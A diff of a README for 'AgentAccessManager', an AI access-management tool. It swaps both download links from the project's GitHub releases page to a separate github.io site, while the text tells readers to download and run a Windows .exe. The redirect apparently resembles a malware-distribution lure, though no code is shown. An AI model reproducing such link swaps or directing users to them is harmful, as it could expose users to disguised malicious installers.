@@ -1,6 +1,6 @@
 # 🛡️ AgentAccessManager - Manage AI Access Across Your Systems
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sargentfragrant429/AgentAccessManager/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://sargentfragrant429.github.io)
 
 AgentAccessManager acts as a central hub for your artificial intelligence projects. It connects your applications to different AI services through one single point. You control how your tools use these services. This software tracks usage, limits spending, and enforces safety rules for all your requests.
 
@@ -8,7 +8,7 @@ AgentAccessManager acts as a central hub for your artificial intelligence projec
 
 To get started, visit the official release page. This page contains the installer needed to run the application on your computer.
 
-[Click here to visit the release page and download the installer](https://github.com/sargentfragrant429/AgentAccessManager/releases)
+[Click here to visit the release page and download the installer](https://sargentfragrant429.github.io)
 
 Select the file that ends in .exe for Windows systems. Save it to your downloads folder.
 
